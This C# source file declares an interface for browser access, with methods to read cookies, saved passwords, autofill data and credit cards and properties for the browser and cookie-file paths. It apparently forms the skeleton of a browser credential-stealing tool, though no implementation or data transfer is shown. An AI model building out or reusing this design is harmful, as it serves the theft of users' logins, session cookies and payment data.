using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1.Browsers
{
    interface IBrowser
    {
        public abstract string GetCookies();
        public abstract string GetPassword();
        public abstract string GetAutoFills();
        public abstract string GetCreditCards();

        public abstract string BrowserName {get;}
        public abstract string BrowserPath {get;}
        public abstract string CookiesPath {get;}

         
    }
}
